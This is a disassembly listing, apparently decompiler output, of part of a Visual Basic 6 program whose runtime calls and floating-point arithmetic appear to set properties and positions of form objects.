00884BC4: and var_00000208, 00000000h
00884BCB: push 00000010h
00884BCD: pop eax
00884BCE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884BD3: lea esi, var_74
00884BD6: mov edi, esp
00884BD8: movsd 
00884BD9: movsd 
00884BDA: movsd 
00884BDB: movsd 
00884BDC: push 00000010h
00884BDE: pop eax
00884BDF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884BE4: lea esi, var_00000094
00884BEA: mov edi, esp
00884BEC: movsd 
00884BED: movsd 
00884BEE: movsd 
00884BEF: movsd 
00884BF0: push 00000010h
00884BF2: pop eax
00884BF3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884BF8: lea esi, var_000000B4
00884BFE: mov edi, esp
00884C00: movsd 
00884C01: movsd 
00884C02: movsd 
00884C03: movsd 
00884C04: push 00000010h
00884C06: pop eax
00884C07: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884C0C: lea esi, var_000000D4
00884C12: mov edi, esp
00884C14: movsd 
00884C15: movsd 
00884C16: movsd 
00884C17: movsd 
00884C18: push 00000004h
00884C1A: push 80011001h
00884C1F: push var_44
00884C22: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00884C27: add esp, 0000004Ch
00884C2A: lea eax, var_44
00884C2D: push eax
00884C2E: lea eax, var_40
00884C31: push eax
00884C32: lea eax, var_3C
00884C35: push eax
00884C36: lea eax, var_38
00884C39: push eax
00884C3A: lea eax, var_34
00884C3D: push eax
00884C3E: lea eax, var_30
00884C41: push eax
00884C42: push 00000006h
00884C44: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00884C49: add esp, 0000001Ch
00884C4C: lea eax, var_64
00884C4F: push eax
00884C50: lea eax, var_54
00884C53: push eax
00884C54: push 00000002h
00884C56: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00884C5B: add esp, 0000000Ch
00884C5E: jmp 00884F9Dh
00884C63: mov var_04, 00000010h
00884C6A: mov eax, [ebp+08h]
00884C6D: mov eax, [eax]
00884C6F: push [ebp+08h]
00884C72: call [eax+00000308h]
00884C78: push eax
00884C79: lea eax, var_30
00884C7C: push eax
00884C7D: call 00410A84h ; Set (object)
00884C82: mov var_00000100, eax
00884C88: lea eax, var_34
00884C8B: push eax
00884C8C: mov ecx, var_24
00884C8F: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884C94: push eax
00884C95: mov eax, var_00000100
00884C9B: mov eax, [eax]
00884C9D: push var_00000100
00884CA3: call [eax+40h]
00884CA6: fclex 
00884CA8: mov var_00000104, eax
00884CAE: cmp var_00000104, 00000000h
00884CB5: jnl 884CD7h
00884CB7: push 00000040h
00884CB9: push 00440DE8h
00884CBE: push var_00000100
00884CC4: push var_00000104
00884CCA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884CCF: mov var_0000020C, eax
00884CD5: jmp 884CDEh
00884CD7: and var_0000020C, 00000000h
00884CDE: push 00000000h
00884CE0: push 68030004h
00884CE5: push var_34
00884CE8: lea eax, var_54
00884CEB: push eax
00884CEC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00884CF1: add esp, 00000010h
00884CF4: mov eax, [ebp+08h]
00884CF7: mov eax, [eax]
00884CF9: push [ebp+08h]
00884CFC: call [eax+00000308h]
00884D02: push eax
00884D03: lea eax, var_38
00884D06: push eax
00884D07: call 00410A84h ; Set (object)
00884D0C: mov var_00000108, eax
00884D12: lea eax, var_3C
00884D15: push eax
00884D16: mov ecx, var_24
00884D19: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884D1E: push eax
00884D1F: mov eax, var_00000108
00884D25: mov eax, [eax]
00884D27: push var_00000108
00884D2D: call [eax+40h]
00884D30: fclex 
00884D32: mov var_0000010C, eax
00884D38: cmp var_0000010C, 00000000h
00884D3F: jnl 884D61h
00884D41: push 00000040h
00884D43: push 00440DE8h
00884D48: push var_00000108
00884D4E: push var_0000010C
00884D54: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884D59: mov var_00000210, eax
00884D5F: jmp 884D68h
00884D61: and var_00000210, 00000000h
00884D68: push 00000000h
00884D6A: push 68030003h
00884D6F: push var_3C
00884D72: lea eax, var_64
00884D75: push eax
00884D76: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00884D7B: add esp, 00000010h
00884D7E: fild dword ptr var_2C
00884D81: fstp real8 ptr var_00000218
00884D87: lea eax, var_54
00884D8A: push eax
00884D8B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00884D90: mov ecx, var_2C
00884D93: imul ecx, eax
00884D96: jo 00885FC6h
00884D9C: mov var_0000021C, ecx
00884DA2: fild dword ptr var_0000021C
00884DA8: fstp real8 ptr var_00000224
00884DAE: fld real8 ptr var_00000224
00884DB4: cmp [008F2000h], 00000000h
00884DBB: jnz 884DC5h
00884DBD: fdiv real8 ptr [0040B998h]
00884DC3: jmp 884DD6h
00884DC5: push [0040B99Ch]
00884DCB: push [0040B998h]
00884DD1: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884DD6: fadd real8 ptr var_00000218
00884DDC: fstp real4 ptr var_6C
00884DDF: fstsw ax
00884DE1: test al, 0Dh
00884DE3: jnz 00885FC1h
00884DE9: mov var_74, 00000004h
00884DF0: fild dword ptr var_28
00884DF3: fstp real8 ptr var_0000022C
00884DF9: lea eax, var_64
00884DFC: push eax
00884DFD: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00884E02: mov ecx, var_28
00884E05: imul ecx, eax
00884E08: jo 00885FC6h
00884E0E: mov var_00000230, ecx
00884E14: fild dword ptr var_00000230
00884E1A: fstp real8 ptr var_00000238
00884E20: fld real8 ptr var_00000238
00884E26: cmp [008F2000h], 00000000h
00884E2D: jnz 884E37h
00884E2F: fdiv real8 ptr [0040DBD0h]
00884E35: jmp 884E48h
00884E37: push [0040DBD4h]
00884E3D: push [0040DBD0h]
00884E43: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00884E48: fsubr real8 ptr var_0000022C
00884E4E: fsub real8 ptr [0040DBC8h]
00884E54: fstp real8 ptr var_0000008C
00884E5A: fstsw ax
00884E5C: test al, 0Dh
00884E5E: jnz 00885FC1h
00884E64: mov var_00000094, 00000005h
00884E6E: mov var_000000AC, 00000002h
00884E78: mov var_000000B4, 00000002h
00884E82: mov var_000000CC, 00000002h
00884E8C: mov var_000000D4, 00000002h
00884E96: mov eax, [ebp+08h]
00884E99: mov eax, [eax]
00884E9B: push [ebp+08h]
00884E9E: call [eax+00000308h]
00884EA4: push eax
00884EA5: lea eax, var_40
00884EA8: push eax
00884EA9: call 00410A84h ; Set (object)
00884EAE: mov var_00000110, eax
00884EB4: lea eax, var_44
00884EB7: push eax
00884EB8: mov ecx, var_24
00884EBB: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884EC0: push eax
00884EC1: mov eax, var_00000110
00884EC7: mov eax, [eax]
00884EC9: push var_00000110
00884ECF: call [eax+40h]
00884ED2: fclex 
00884ED4: mov var_00000114, eax
00884EDA: cmp var_00000114, 00000000h
00884EE1: jnl 884F03h
00884EE3: push 00000040h
00884EE5: push 00440DE8h
00884EEA: push var_00000110
00884EF0: push var_00000114
00884EF6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00884EFB: mov var_0000023C, eax
00884F01: jmp 884F0Ah
00884F03: and var_0000023C, 00000000h
00884F0A: push 00000010h
00884F0C: pop eax
00884F0D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884F12: lea esi, var_74
00884F15: mov edi, esp
00884F17: movsd 
00884F18: movsd 
00884F19: movsd 
00884F1A: movsd 
00884F1B: push 00000010h
00884F1D: pop eax
00884F1E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884F23: lea esi, var_00000094
00884F29: mov edi, esp
00884F2B: movsd 
00884F2C: movsd 
00884F2D: movsd 
00884F2E: movsd 
00884F2F: push 00000010h
00884F31: pop eax
00884F32: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884F37: lea esi, var_000000B4
00884F3D: mov edi, esp
00884F3F: movsd 
00884F40: movsd 
00884F41: movsd 
00884F42: movsd 
00884F43: push 00000010h
00884F45: pop eax
00884F46: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00884F4B: lea esi, var_000000D4
00884F51: mov edi, esp
00884F53: movsd 
00884F54: movsd 
00884F55: movsd 
00884F56: movsd 
00884F57: push 00000004h
00884F59: push 80011001h
00884F5E: push var_44
00884F61: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00884F66: add esp, 0000004Ch
00884F69: lea eax, var_44
00884F6C: push eax
00884F6D: lea eax, var_40
00884F70: push eax
00884F71: lea eax, var_3C
00884F74: push eax
00884F75: lea eax, var_38
00884F78: push eax
00884F79: lea eax, var_34
00884F7C: push eax
00884F7D: lea eax, var_30
00884F80: push eax
00884F81: push 00000006h
00884F83: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00884F88: add esp, 0000001Ch
00884F8B: lea eax, var_64
00884F8E: push eax
00884F8F: lea eax, var_54
00884F92: push eax
00884F93: push 00000002h
00884F95: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00884F9A: add esp, 0000000Ch
00884F9D: mov var_04, 00000012h
00884FA4: mov eax, [ebp+08h]
00884FA7: mov eax, [eax]
00884FA9: push [ebp+08h]
00884FAC: call [eax+00000314h]
00884FB2: push eax
00884FB3: lea eax, var_38
00884FB6: push eax
00884FB7: call 00410A84h ; Set (object)
00884FBC: mov var_00000108, eax
00884FC2: lea eax, var_3C
00884FC5: push eax
00884FC6: mov ecx, var_24
00884FC9: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00884FCE: push eax
00884FCF: mov eax, var_00000108
00884FD5: mov eax, [eax]
00884FD7: push var_00000108
00884FDD: call [eax+40h]
00884FE0: fclex 
00884FE2: mov var_0000010C, eax
00884FE8: cmp var_0000010C, 00000000h
00884FEF: jnl 885011h
00884FF1: push 00000040h
00884FF3: push 00440DE8h
00884FF8: push var_00000108
00884FFE: push var_0000010C
00885004: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885009: mov var_00000240, eax
0088500F: jmp 885018h
00885011: and var_00000240, 00000000h
00885018: mov eax, var_3C
0088501B: mov var_00000110, eax
00885021: mov eax, [ebp+08h]
00885024: mov eax, [eax]
00885026: push [ebp+08h]
00885029: call [eax+00000308h]
0088502F: push eax
00885030: lea eax, var_30
00885033: push eax
00885034: call 00410A84h ; Set (object)
00885039: mov var_00000100, eax
0088503F: lea eax, var_34
00885042: push eax
00885043: mov ecx, var_24
00885046: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088504B: push eax
0088504C: mov eax, var_00000100
00885052: mov eax, [eax]
00885054: push var_00000100
0088505A: call [eax+40h]
0088505D: fclex 
0088505F: mov var_00000104, eax
00885065: cmp var_00000104, 00000000h
0088506C: jnl 88508Eh
0088506E: push 00000040h
00885070: push 00440DE8h
00885075: push var_00000100
0088507B: push var_00000104
00885081: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885086: mov var_00000244, eax
0088508C: jmp 885095h
0088508E: and var_00000244, 00000000h
00885095: push 00000000h
00885097: push 80010003h
0088509C: push var_34
0088509F: lea eax, var_54
008850A2: push eax
008850A3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008850A8: add esp, 00000010h
008850AB: push eax
008850AC: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008850B1: push ecx
008850B2: fstp real4 ptr [esp]
008850B5: mov eax, var_00000110
008850BB: mov eax, [eax]
008850BD: push var_00000110
008850C3: call [eax+64h]
008850C6: fclex 
008850C8: mov var_00000114, eax
008850CE: cmp var_00000114, 00000000h
008850D5: jnl 8850F7h
008850D7: push 00000064h
008850D9: push 00456A8Ch
008850DE: push var_00000110
008850E4: push var_00000114
008850EA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008850EF: mov var_00000248, eax
008850F5: jmp 8850FEh
008850F7: and var_00000248, 00000000h
008850FE: lea eax, var_3C
00885101: push eax
00885102: lea eax, var_38
00885105: push eax
00885106: lea eax, var_34
00885109: push eax
0088510A: lea eax, var_30
0088510D: push eax
0088510E: push 00000004h
00885110: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885115: add esp, 00000014h
00885118: lea ecx, var_54
0088511B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00885120: mov var_04, 00000013h
00885127: mov eax, [ebp+08h]
0088512A: mov eax, [eax]
0088512C: push [ebp+08h]
0088512F: call [eax+00000308h]
00885135: push eax
00885136: lea eax, var_30
00885139: push eax
0088513A: call 00410A84h ; Set (object)
0088513F: mov var_00000100, eax
00885145: lea eax, var_34
00885148: push eax
00885149: mov ecx, var_24
0088514C: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00885151: push eax
00885152: mov eax, var_00000100
00885158: mov eax, [eax]
0088515A: push var_00000100
00885160: call [eax+40h]
00885163: fclex 
00885165: mov var_00000104, eax
0088516B: cmp var_00000104, 00000000h
00885172: jnl 885194h
00885174: push 00000040h
00885176: push 00440DE8h
0088517B: push var_00000100
00885181: push var_00000104
00885187: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088518C: mov var_0000024C, eax
00885192: jmp 88519Bh
00885194: and var_0000024C, 00000000h
0088519B: push 00000000h
0088519D: push 68030005h
008851A2: push var_34
008851A5: lea eax, var_54
008851A8: push eax
008851A9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008851AE: add esp, 00000010h
008851B1: mov eax, [ebp+08h]
008851B4: mov eax, [eax]
008851B6: push [ebp+08h]
008851B9: call [eax+00000314h]
008851BF: push eax
008851C0: lea eax, var_40
008851C3: push eax
008851C4: call 00410A84h ; Set (object)
008851C9: mov var_00000110, eax
008851CF: lea eax, var_44
008851D2: push eax
008851D3: mov ecx, var_24
008851D6: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008851DB: push eax
008851DC: mov eax, var_00000110
008851E2: mov eax, [eax]
008851E4: push var_00000110
008851EA: call [eax+40h]
008851ED: fclex 
008851EF: mov var_00000114, eax
008851F5: cmp var_00000114, 00000000h
008851FC: jnl 88521Eh
008851FE: push 00000040h
00885200: push 00440DE8h
00885205: push var_00000110
0088520B: push var_00000114
00885211: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885216: mov var_00000250, eax
0088521C: jmp 885225h
0088521E: and var_00000250, 00000000h
00885225: mov eax, var_44
00885228: mov var_00000118, eax
0088522E: mov eax, [ebp+08h]
00885231: mov eax, [eax]
00885233: push [ebp+08h]
00885236: call [eax+0000030Ch]
0088523C: push eax
0088523D: lea eax, var_38
00885240: push eax
00885241: call 00410A84h ; Set (object)
00885246: mov var_00000108, eax
0088524C: lea eax, var_3C
0088524F: push eax
00885250: lea eax, var_54
00885253: push eax
00885254: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00885259: mov ecx, eax
0088525B: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00885260: push eax
00885261: mov eax, var_00000108
00885267: mov eax, [eax]
00885269: push var_00000108
0088526F: call [eax+40h]
00885272: fclex 
00885274: mov var_0000010C, eax
0088527A: cmp var_0000010C, 00000000h
00885281: jnl 8852A3h
00885283: push 00000040h
00885285: push 00440DE8h
0088528A: push var_00000108
00885290: push var_0000010C
00885296: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088529B: mov var_00000254, eax
008852A1: jmp 8852AAh
008852A3: and var_00000254, 00000000h
008852AA: push 00000000h
008852AC: push 80010003h
008852B1: push var_3C
008852B4: lea eax, var_64
008852B7: push eax
008852B8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008852BD: add esp, 00000010h
008852C0: push eax
008852C1: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008852C6: push ecx
008852C7: fstp real4 ptr [esp]
008852CA: mov eax, var_00000118
008852D0: mov eax, [eax]
008852D2: push var_00000118
008852D8: call [eax+74h]
008852DB: fclex 
008852DD: mov var_0000011C, eax
008852E3: cmp var_0000011C, 00000000h
008852EA: jnl 88530Ch
008852EC: push 00000074h
008852EE: push 00456A8Ch
008852F3: push var_00000118
008852F9: push var_0000011C
008852FF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885304: mov var_00000258, eax
0088530A: jmp 885313h
0088530C: and var_00000258, 00000000h
00885313: lea eax, var_44
00885316: push eax
00885317: lea eax, var_40
0088531A: push eax
0088531B: lea eax, var_3C
0088531E: push eax
0088531F: lea eax, var_38
00885322: push eax
00885323: lea eax, var_34
00885326: push eax
00885327: lea eax, var_30
0088532A: push eax
0088532B: push 00000006h
0088532D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885332: add esp, 0000001Ch
00885335: lea eax, var_64
00885338: push eax
00885339: lea eax, var_54
0088533C: push eax
0088533D: push 00000002h
0088533F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00885344: add esp, 0000000Ch
00885347: mov var_04, 00000014h
0088534E: mov eax, [ebp+08h]
00885351: mov eax, [eax]
00885353: push [ebp+08h]
00885356: call [eax+00000314h]
0088535C: push eax
0088535D: lea eax, var_38
00885360: push eax
00885361: call 00410A84h ; Set (object)
00885366: mov var_00000108, eax
0088536C: lea eax, var_3C
0088536F: push eax
00885370: mov ecx, var_24
00885373: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00885378: push eax
00885379: mov eax, var_00000108
0088537F: mov eax, [eax]
00885381: push var_00000108
00885387: call [eax+40h]
0088538A: fclex 
0088538C: mov var_0000010C, eax
00885392: cmp var_0000010C, 00000000h
00885399: jnl 8853BBh
0088539B: push 00000040h
0088539D: push 00440DE8h
008853A2: push var_00000108
008853A8: push var_0000010C
008853AE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008853B3: mov var_0000025C, eax
008853B9: jmp 8853C2h
008853BB: and var_0000025C, 00000000h
008853C2: mov eax, var_3C
008853C5: mov var_00000110, eax
008853CB: mov eax, [ebp+08h]
008853CE: mov eax, [eax]
008853D0: push [ebp+08h]
008853D3: call [eax+00000308h]
008853D9: push eax
008853DA: lea eax, var_30
008853DD: push eax
008853DE: call 00410A84h ; Set (object)
008853E3: mov var_00000100, eax
008853E9: lea eax, var_34
008853EC: push eax
008853ED: mov ecx, var_24
008853F0: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008853F5: push eax
008853F6: mov eax, var_00000100
008853FC: mov eax, [eax]
008853FE: push var_00000100
00885404: call [eax+40h]
00885407: fclex 
00885409: mov var_00000104, eax
0088540F: cmp var_00000104, 00000000h
00885416: jnl 885438h
00885418: push 00000040h
0088541A: push 00440DE8h
0088541F: push var_00000100
00885425: push var_00000104
0088542B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885430: mov var_00000260, eax
00885436: jmp 88543Fh
00885438: and var_00000260, 00000000h
0088543F: push 00000000h
00885441: push 80010004h
00885446: push var_34
00885449: lea eax, var_54
0088544C: push eax
0088544D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00885452: add esp, 00000010h
00885455: push eax
00885456: call 004107EAh ; msvbvm60.dll.__vbaR4Var
0088545B: push ecx
0088545C: fstp real4 ptr [esp]
0088545F: mov eax, var_00000110
00885465: mov eax, [eax]
00885467: push var_00000110
0088546D: call [eax+6Ch]
00885470: fclex 
00885472: mov var_00000114, eax
00885478: cmp var_00000114, 00000000h
0088547F: jnl 8854A1h
00885481: push 0000006Ch
00885483: push 00456A8Ch
00885488: push var_00000110
0088548E: push var_00000114
00885494: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885499: mov var_00000264, eax
0088549F: jmp 8854A8h
008854A1: and var_00000264, 00000000h
008854A8: lea eax, var_3C
008854AB: push eax
008854AC: lea eax, var_38
008854AF: push eax
008854B0: lea eax, var_34
008854B3: push eax
008854B4: lea eax, var_30
008854B7: push eax
008854B8: push 00000004h
008854BA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008854BF: add esp, 00000014h
008854C2: lea ecx, var_54
008854C5: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008854CA: mov var_04, 00000015h
008854D1: mov eax, [ebp+08h]
008854D4: mov eax, [eax]
008854D6: push [ebp+08h]
008854D9: call [eax+00000308h]
008854DF: push eax
008854E0: lea eax, var_30
008854E3: push eax
008854E4: call 00410A84h ; Set (object)
008854E9: mov var_00000100, eax
008854EF: lea eax, var_34
008854F2: push eax
008854F3: mov ecx, var_24
008854F6: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008854FB: push eax
008854FC: mov eax, var_00000100
00885502: mov eax, [eax]
00885504: push var_00000100
0088550A: call [eax+40h]
0088550D: fclex 
0088550F: mov var_00000104, eax
00885515: cmp var_00000104, 00000000h
0088551C: jnl 88553Eh
0088551E: push 00000040h
00885520: push 00440DE8h
00885525: push var_00000100
0088552B: push var_00000104
00885531: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885536: mov var_00000268, eax
0088553C: jmp 885545h
0088553E: and var_00000268, 00000000h
00885545: push 00000000h
00885547: push 68030005h
0088554C: push var_34
0088554F: lea eax, var_54
00885552: push eax
00885553: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00885558: add esp, 00000010h
0088555B: mov eax, [ebp+08h]
0088555E: mov eax, [eax]
00885560: push [ebp+08h]
00885563: call [eax+00000314h]
00885569: push eax
0088556A: lea eax, var_40
0088556D: push eax
0088556E: call 00410A84h ; Set (object)
00885573: mov var_00000110, eax
00885579: lea eax, var_44
0088557C: push eax
0088557D: mov ecx, var_24
00885580: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00885585: push eax
00885586: mov eax, var_00000110
0088558C: mov eax, [eax]
0088558E: push var_00000110
00885594: call [eax+40h]
00885597: fclex 
00885599: mov var_00000114, eax
0088559F: cmp var_00000114, 00000000h
008855A6: jnl 8855C8h
008855A8: push 00000040h
008855AA: push 00440DE8h
008855AF: push var_00000110
008855B5: push var_00000114
008855BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008855C0: mov var_0000026C, eax
008855C6: jmp 8855CFh
008855C8: and var_0000026C, 00000000h
008855CF: mov eax, var_44
008855D2: mov var_00000118, eax
008855D8: mov eax, [ebp+08h]
008855DB: mov eax, [eax]
008855DD: push [ebp+08h]
008855E0: call [eax+0000030Ch]
008855E6: push eax
008855E7: lea eax, var_38
008855EA: push eax
008855EB: call 00410A84h ; Set (object)
008855F0: mov var_00000108, eax
008855F6: lea eax, var_3C
008855F9: push eax
008855FA: lea eax, var_54
008855FD: push eax
008855FE: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00885603: mov ecx, eax
00885605: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088560A: push eax
0088560B: mov eax, var_00000108
00885611: mov eax, [eax]
00885613: push var_00000108
00885619: call [eax+40h]
0088561C: fclex 
0088561E: mov var_0000010C, eax
00885624: cmp var_0000010C, 00000000h
0088562B: jnl 88564Dh
0088562D: push 00000040h
0088562F: push 00440DE8h
00885634: push var_00000108
0088563A: push var_0000010C
00885640: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885645: mov var_00000270, eax
0088564B: jmp 885654h
0088564D: and var_00000270, 00000000h
00885654: push 00000000h
00885656: push 80010004h
0088565B: push var_3C
0088565E: lea eax, var_64
00885661: push eax
00885662: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00885667: add esp, 00000010h
0088566A: push eax
0088566B: call 004107EAh ; msvbvm60.dll.__vbaR4Var
00885670: push ecx
00885671: fstp real4 ptr [esp]
00885674: mov eax, var_00000118
0088567A: mov eax, [eax]
0088567C: push var_00000118
00885682: call [eax+7Ch]
00885685: fclex 
00885687: mov var_0000011C, eax
0088568D: cmp var_0000011C, 00000000h
00885694: jnl 8856B6h
00885696: push 0000007Ch
00885698: push 00456A8Ch
0088569D: push var_00000118
008856A3: push var_0000011C
008856A9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008856AE: mov var_00000274, eax
008856B4: jmp 8856BDh
008856B6: and var_00000274, 00000000h
008856BD: lea eax, var_44
008856C0: push eax
008856C1: lea eax, var_40
008856C4: push eax
008856C5: lea eax, var_3C
008856C8: push eax
008856C9: lea eax, var_38
008856CC: push eax
008856CD: lea eax, var_34
008856D0: push eax
008856D1: lea eax, var_30
008856D4: push eax
008856D5: push 00000006h
008856D7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008856DC: add esp, 0000001Ch
008856DF: lea eax, var_64
008856E2: push eax
008856E3: lea eax, var_54
008856E6: push eax
008856E7: push 00000002h
008856E9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008856EE: add esp, 0000000Ch
008856F1: mov var_04, 00000016h
008856F8: jmp 00884833h
008856FD: mov var_04, 00000017h
00885704: mov eax, [ebp+08h]
00885707: mov eax, [eax]
00885709: push [ebp+08h]
0088570C: call [eax+000002FCh]
00885712: push eax
00885713: lea eax, var_30
00885716: push eax
00885717: call 00410A84h ; Set (object)
0088571C: mov var_00000100, eax
00885722: lea eax, var_000000EC
00885728: push eax
00885729: mov eax, var_00000100
0088572F: mov eax, [eax]
00885731: push var_00000100
00885737: call [eax+70h]
0088573A: fclex 
0088573C: mov var_00000104, eax
00885742: cmp var_00000104, 00000000h
00885749: jnl 88576Bh
0088574B: push 00000070h
0088574D: push 00440EDCh
00885752: push var_00000100
00885758: push var_00000104
0088575E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00885763: mov var_00000278, eax
00885769: jmp 885772h
0088576B: and var_00000278, 00000000h
00885772: mov eax, [ebp+08h]
00885775: mov eax, [eax]
00885777: push [ebp+08h]
0088577A: call [eax+000002FCh]
00885780: push eax
00885781: lea eax, var_34
00885784: push eax
00885785: call 00410A84h ; Set (object)
0088578A: mov var_00000108, eax
00885790: lea eax, var_000000F0
00885796: push eax
00885797: mov eax, var_00000108
0088579D: mov eax, [eax]
0088579F: push var_00000108
008857A5: call [eax+78h]
008857A8: fclex 
008857AA: mov var_0000010C, eax
008857B0: cmp var_0000010C, 00000000h
008857B7: jnl 8857D9h
008857B9: push 00000078h
008857BB: push 00440EDCh
008857C0: push var_00000108
008857C6: push var_0000010C
008857CC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008857D1: mov var_0000027C, eax
008857D7: jmp 8857E0h
008857D9: and var_0000027C, 00000000h
008857E0: mov eax, [ebp+08h]
008857E3: mov eax, [eax]
008857E5: push [ebp+08h]
008857E8: call [eax+0000031Ch]
008857EE: push eax
008857EF: lea eax, var_38
008857F2: push eax
008857F3: call 00410A84h ; Set (object)
008857F8: mov var_00000110, eax
008857FE: mov var_0000008C, 80020004h
00885808: mov var_00000094, 0000000Ah
00885812: mov var_7C, 80020004h
00885819: mov var_00000084, 0000000Ah
00885823: fld real4 ptr var_000000F0
00885829: fabs 
0088582B: fadd real8 ptr [00407140h]
00885831: fstp real4 ptr var_6C
00885834: fstsw ax
00885836: test al, 0Dh
00885838: jnz 00885FC1h
0088583E: mov var_74, 00000004h
00885845: push 00000010h
00885847: pop eax
00885848: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088584D: lea esi, var_00000094
00885853: mov edi, esp
00885855: movsd 
00885856: movsd 
00885857: movsd 
00885858: movsd 
00885859: push 00000010h
0088585B: pop eax
0088585C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885861: lea esi, var_00000084
00885867: mov edi, esp
00885869: movsd 
0088586A: movsd 
0088586B: movsd 
0088586C: movsd 
0088586D: push 00000010h
0088586F: pop eax
00885870: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00885875: lea esi, var_74
00885878: mov edi, esp
0088587A: movsd 
0088587B: movsd 
0088587C: movsd 
0088587D: movsd 
0088587E: fld real4 ptr var_000000EC
00885884: fabs 
00885886: fadd real8 ptr [00407140h]
0088588C: fstsw ax
0088588E: test al, 0Dh
00885890: jnz 00885FC1h
00885896: fstp real4 ptr var_00000280
0088589C: fld real4 ptr var_00000280
008858A2: push ecx
008858A3: fstp real4 ptr [esp]
008858A6: mov eax, var_00000110
008858AC: mov eax, [eax]
008858AE: push var_00000110
008858B4: call [eax+000001D0h]
008858BA: fclex 
008858BC: mov var_00000114, eax
008858C2: cmp var_00000114, 00000000h
008858C9: jnl 8858EEh
008858CB: push 000001D0h
008858D0: push 004425E4h
008858D5: push var_00000110
008858DB: push var_00000114
008858E1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008858E6: mov var_00000284, eax
008858EC: jmp 8858F5h
008858EE: and var_00000284, 00000000h
008858F5: lea eax, var_38
008858F8: push eax
008858F9: lea eax, var_34
008858FC: push eax
008858FD: lea eax, var_30
00885900: push eax
00885901: push 00000003h
00885903: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00885908: add esp, 00000010h
0088590B: mov var_04, 00000018h
00885912: mov eax, [ebp+08h]
00885915: mov eax, [eax]
00885917: push [ebp+08h]
0088591A: call [eax+0000031Ch]
00885920: push eax
00885921: lea eax, var_30
00885924: push eax
00885925: call 00410A84h ; Set (object)
0088592A: mov var_00000100, eax
00885930: lea eax, var_000000EC
00885936: push eax
00885937: mov eax, var_00000100
0088593D: mov eax, [eax]
0088593F: push var_00000100
00885945: call [eax+70h]
00885948: fclex 
0088594A: mov var_00000104, eax
00885950: cmp var_00000104, 00000000h
00885957: jnl 885979h
00885959: push 00000070h
0088595B: push 004425E4h
00885960: push var_00000100
00885966: push var_00000104
0088596C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
